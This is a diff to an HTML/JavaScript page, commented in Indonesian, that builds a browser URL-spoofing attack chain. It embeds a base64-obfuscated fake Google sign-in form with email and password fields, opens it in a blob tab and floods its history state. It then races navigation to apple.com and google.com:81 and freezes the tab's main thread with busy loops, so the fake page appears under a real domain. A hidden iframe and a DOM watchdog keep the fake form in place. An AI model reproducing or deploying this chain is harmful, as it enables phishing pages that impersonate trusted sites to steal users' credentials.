@@ -6,7 +6,9 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Scheme-Validation & Pipeline Race Engine</title>
+    <title>Ultimate Full-Chaining Pipeline & Scheme Engine</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
       body, html {
         margin: 0;
@@ -14,7 +16,7 @@
         height: 100%;
         background: #050507;
         color: #fff;
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
       }
       .container {
         display: flex;
@@ -26,117 +28,193 @@
         padding: 20px;
         box-sizing: border-box;
       }
+      .login-container {
+        background-color: #fff;
+        padding: 2.5rem;
+        border-radius: 8px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+        width: 100%;
+        max-width: 400px;
+        text-align: center;
+        color: #111;
+        box-sizing: border-box;
+      }
+      .input-field {
+        width: 100%;
+        padding: 0.75rem 1rem;
+        margin-bottom: 1.25rem;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 1rem;
+        box-sizing: border-box;
+      }
+      .btn-primary {
+        background-color: #1a73e8;
+        color: #fff;
+        padding: 0.75rem 1.5rem;
+        border-radius: 4px;
+        font-size: 1rem;
+        font-weight: 500;
+        cursor: pointer;
+        width: 100%;
+      }
       h1 {
-        font-size: 22px;
-        margin-bottom: 10px;
+        font-size: 24px;
+        margin-bottom: 8px;
         color: #f5f5f7;
         text-align: center;
-      }
-      button {
-        width: 100%;
-        max-width: 420px;
-        padding: 24px;
-        font-size: 20px;
-        font-weight: bold;
-        background: #ff3b30;
-        color: #fff;
-        border: none;
-        border-radius: 16px;
-        cursor: pointer;
-        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.45);
-        transition: transform 0.1s ease;
-      }
-      button:active {
-        transform: scale(0.96);
+        font-weight: 800;
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <h1>Scheme-Validation Engine</h1>
-      <button id="startBtn">EXECUTE SCHEME RACE LOCK</button>
+      <h1>Advanced Full Chaining Engine</h1>
+      <button id="startBtn" class="w-full max-w-[420px] p-6 text-xl font-bold bg-red-600 text-white rounded-2xl shadow-xl cursor-pointer hover:bg-red-700 transition">
+        EXECUTE FULL CHAIN LOCK
+      </button>
     </div>
+
+    <!-- Hidden Scheme Validation & Frame Interception Chaining Iframe -->
+    <iframe style="display:none" srcdoc="<script>setTimeout(()=>{location='x://'}, 80);</script>"></iframe>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membangun Payload Self-Healing & History Watchdog dalam format Base64
+        // 1. Membangun Payload Injeksi Terpadu (Google Credential Form + DOM Watchdog + Scheme Race)
         const rawPayload = `
           <!DOCTYPE html>
-          <html>
+          <html lang="en">
           <head>
-            <title>Apple</title>
-            <meta name="viewport" content="width=device-width, initial-scale=1">
+              <meta charset="UTF-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <title>Sign in - Google Accounts</title>
+              <script src="https://cdn.tailwindcss.com"><\/script>
+              <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+              <style>
+                  body {
+                      font-family: 'Inter', sans-serif;
+                      background-color: #f0f2f5;
+                      display: flex;
+                      justify-content: center;
+                      align-items: center;
+                      min-height: 100vh;
+                      margin: 0;
+                  }
+                  .login-container {
+                      background-color: #fff;
+                      padding: 2.5rem;
+                      border-radius: 8px;
+                      box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
+                      width: 100%;
+                      max-width: 400px;
+                      text-align: center;
+                      box-sizing: border-box;
+                  }
+                  .input-field {
+                      width: 100%;
+                      padding: 0.75rem 1rem;
+                      margin-bottom: 1.25rem;
+                      border: 1px solid #dadce0;
+                      border-radius: 4px;
+                      font-size: 1rem;
+                      box-sizing: border-box;
+                  }
+                  .btn-primary {
+                      background-color: #1a73e8;
+                      color: #fff;
+                      padding: 0.75rem 1.5rem;
+                      border-radius: 4px;
+                      font-size: 1rem;
+                      font-weight: 500;
+                      cursor: pointer;
+                      width: 100%;
+                  }
+              </style>
           </head>
-          <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-            <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
-            <script>
-              // Watchdog Mandiri untuk mempertahankan struktur DOM
-              try {
-                const observer = new MutationObserver(() => {
-                  if (!document.getElementById('spoof-text')) {
-                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
-                  }
-                });
-                observer.observe(document.documentElement, { childList: true, subtree: true });
-              } catch(e) {}
+          <body>
+              <div class="login-container">
+                  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
+                  <h1 class="text-2xl font-normal mb-2">Sign in</h1>
+                  <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
 
-              // Interval pembersihan history state untuk mengunci pipeline controller
-              setInterval(() => {
+                  <form id="loginForm" action="javascript:document.body.innerHTML='<h1 style=\\'color:#000;text-align:center;margin-top:20vh;font-size:48px;\\'>Pwned - Context Locked</h1>'">
+                      <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
+                      <input type="password" id="password" class="input-field" placeholder="Password" required>
+                      <button type="submit" class="btn-primary">Next</button>
+                  </form>
+              </div>
+
+              <script>
+                // DOM Mutation Shield & History State Flooding Watchdog
                 try {
-                  history.pushState({race: Math.random()}, "", "#scheme-lock");
-                  if (!document.getElementById('spoof-text')) {
-                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
-                  }
-                } catch(err) {}
-              }, 4);
-            <\/script>
+                  const observer = new MutationObserver(() => {
+                    if (!document.getElementById('loginForm')) {
+                      location.reload();
+                    }
+                  });
+                  observer.observe(document.documentElement, { childList: true, subtree: true });
+                } catch(e) {}
+
+                setInterval(() => {
+                  try {
+                    history.pushState({chain_lock: Math.random()}, "", "#secure-enclave");
+                  } catch(err) {}
+                }, 3);
+
+                // Port & Scheme Validation Race Trigger
+                setTimeout(() => {
+                  try {
+                    window.open('https://www.google.com:81', '_self');
+                  } catch(e) {}
+                }, 50);
+              <\/script>
           </body>
           </html>
         `;
 
-        // Konversi dinamis ke Base64 untuk pengaburan struktur
+        // 2. Enkripsi Dinamis Base64 untuk Obfuscation Payload
         const encoded = btoa(unescape(encodeURIComponent(rawPayload)));
         const decoded = decodeURIComponent(escape(atob(encoded)));
 
-        // Membentuk Blob Stream langsung sebagai inisialisasi awal jendela (Bypass about:blank)
+        // Inisialisasi Blob Stream (Bypass about:blank secara instan)
         const blob = new Blob([decoded], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
-        // 2. Membuka tab baru menggunakan referensi jendela mandiri
+        // 3. Membuka jendela baru menggunakan referensi terisolasi
         const newTab = window.open(blobUrl, "_blank");
 
         if (newTab) {
           try { newTab.focus(); } catch (e) {}
 
-          // 3. Chain Step A (6ms): Menginjeksikan history state sebelum validasi skema selesai
+          // Chain Step A (5ms): Provisional history state flooding
           setTimeout(() => {
             try {
-              newTab.history.pushState({scheme_flood: true}, "", "#provisional-state");
+              newTab.history.pushState({state: 'provisional'}, "", "#race-sync");
             } catch (err) {}
-          }, 6);
+          }, 5);
 
-          // 4. Chain Step B (16ms): Memicu Redirect-Scheme / Target Navigation Race Condition
+          // Chain Step B (15ms): Scheme-Validation Race Condition & Target Transition ke Domain Sah
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {}
-          }, 16);
+          }, 15);
 
-          // 5. Chain Step C (30ms): Mengunci main thread browser secara sinkronus untuk menahan callback konfirmasi
+          // Chain Step C (30ms): Main Thread Stalling / Pipeline Deadlock
           setTimeout(() => {
             try {
               newTab.eval(`
                 const startTime = Date.now();
-                while (Date.now() - startTime < 6000) {
+                while (Date.now() - startTime < 7000) {
                   const reflow = document.body.offsetHeight;
                   document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
                 }
               `);
             } catch (e) {
               let start = Date.now();
-              while (Date.now() - start < 6000) {}
+              while (Date.now() - start < 7000) {}
             }
           }, 30);
         }
